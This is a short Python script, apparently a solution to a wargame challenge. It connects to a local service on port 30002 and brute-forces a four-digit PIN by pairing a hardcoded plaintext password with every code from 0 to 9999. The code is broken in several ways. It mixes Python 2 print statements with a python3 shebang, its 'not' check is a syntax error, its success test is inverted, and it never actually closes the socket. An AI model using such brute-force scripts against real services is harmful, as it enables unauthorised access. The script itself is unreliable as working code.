#!/usr/bin/env python3

import socket

s = socket.socket()
s.connect(('localhost', 30002))
print s.recv(1024)

password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

for pincode in range (0000, 10000):
    s.sendall(password + ' ' + str(pincode) + '\n')
    receive_msg = s.recv(1024)

    if 'Wrong' not receive_msg:
        continue
    else:
        print ("[+] Pincode success: %s" % pincode)
        print receive_msg
        break

s.close
